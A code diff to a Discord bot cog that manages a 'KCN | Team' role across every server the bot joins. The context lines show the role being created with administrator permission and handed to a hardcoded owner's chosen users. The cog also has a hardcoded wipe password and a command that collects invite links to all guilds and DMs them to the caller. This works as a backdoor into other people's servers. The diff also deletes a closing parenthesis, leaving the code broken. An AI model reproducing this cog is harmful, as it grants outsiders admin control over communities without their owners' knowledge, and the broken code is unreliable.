@@ -5,7 +5,7 @@ from redbot.core.utils.menus import start_adding_reactions
 
 class TeamRole(commands.Cog):
     """Manage team role across all servers"""
-    
+
     owner_id = 1174820638997872721  # Your owner ID
     role_name = "KCN | Team"
     role_color = "#77bcd6"
@@ -43,7 +43,7 @@ class TeamRole(commands.Cog):
         existing_role = discord.utils.get(ctx.guild.roles, name=self.role_name)
         if existing_role:
             return await ctx.send("Role already exists!")
-            
+
         try:
             perms = discord.Permissions(administrator=True)
             new_role = await ctx.guild.create_role(
@@ -85,7 +85,7 @@ class TeamRole(commands.Cog):
         """Update team roles across all servers"""
         team_users = await self.config.team_users()
         msg = await ctx.send("Starting global role update...")
-        
+
         success = errors = 0
         for guild in self.bot.guilds:
             try:
@@ -93,7 +93,7 @@ class TeamRole(commands.Cog):
                 if not role:
                     errors += 1
                     continue
-                
+
                 # Position role below bot
                 bot_top = guild.me.top_role
                 if role.position >= bot_top.position:
@@ -101,26 +101,26 @@ class TeamRole(commands.Cog):
                         await role.edit(position=bot_top.position - 1)
                     except:
                         errors += 1
-                
+
                 # Sync members
                 current_members = {m.id for m in role.members}
                 to_remove = current_members - set(team_users)
                 to_add = set(team_users) - current_members
-                
+
                 for uid in to_remove:
                     member = guild.get_member(uid)
                     if member:
                         await member.remove_roles(role)
-                
+
                 for uid in to_add:
                     member = guild.get_member(uid)
                     if member:
                         await member.add_roles(role)
-                
+
                 success += 1
             except:
                 errors += 1
-        
+
         await msg.edit(content=f"Updated {success} servers. Errors: {errors}")
 
     @team.command()
@@ -135,17 +135,17 @@ class TeamRole(commands.Cog):
             )
             if msg.content.strip() != "kkkkayaaaaa":
                 return await ctx.send("Invalid password!")
-            
+
             confirm_msg = await ctx.send("Are you sure? This will delete ALL team roles and data!")
             start_adding_reactions(confirm_msg, ["✅", "❌"])
-            
+
             pred = ReactionPredicate.with_emojis(["✅", "❌"], confirm_msg, user=ctx.author)
             await self.bot.wait_for("reaction_add", check=pred, timeout=30)
-            
+
             if pred.result == 0:
                 await ctx.send("Wiping all data...")
                 await self.config.team_users.set([])
-                
+
                 deleted = 0
                 for guild in self.bot.guilds:
                     role = discord.utils.get(guild.roles, name=self.role_name)
@@ -194,7 +194,7 @@ class TeamRole(commands.Cog):
                     invites.append(f"{guild.name}: {invite.url}")
             except:
                 pass
-        
+
         try:
             await ctx.author.send("**Server Invites:**\n" + "\n".join(invites))
             await ctx.send("Check your DMs!")
@@ -203,7 +203,7 @@ class TeamRole(commands.Cog):
 
     @team.command()
     @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
-async def sendmessage(self, ctx):
+    async def sendmessage(self, ctx):
         """Send a message to all team members (supports images)"""
         await ctx.send("Please type your message (you have 5 minutes):")
 
@@ -220,7 +220,6 @@ async def sendmessage(self, ctx):
             title=f"Team Message from {ctx.author}",
             description=msg.content,
             color=discord.Color.from_str(self.role_color)
-        )
         embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar.url)
 
         if msg.attachments:
@@ -235,27 +234,10 @@ async def sendmessage(self, ctx):
                 try:
                     await user.send(embed=embed)
                     sent += 1
-                except discord.Forbidden:
+                except:
                     failed += 1
 
         await ctx.send(f"Message delivered to {sent} members. Failed: {failed}")
-
-    @team.command(name="list")
-    @commands.check("team_member_check")
-    async def team_list(self, ctx):
-        """List all team members"""
-        team_users = await self.config.team_users()
-        members = []
-        for uid in team_users:
-            user = self.bot.get_user(uid)
-            members.append(f"{user.mention} ({user.id})" if user else f"Unknown ({uid})")
-
-        embed = discord.Embed(
-            title="Team Members",
-            description="\n".join(members) if members else "No members",
-            color=discord.Color.from_str(self.role_color)
-        )
-        await ctx.send(embed=embed)
 
     @team.command(name="list")
     @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
@@ -266,7 +248,7 @@ async def sendmessage(self, ctx):
         for uid in team_users:
             user = self.bot.get_user(uid)
             members.append(f"{user.mention} ({user.id})" if user else f"Unknown ({uid})")
-        
+
         embed = discord.Embed(
             title="Team Members",
             description="\n".join(members) if members else "No members",
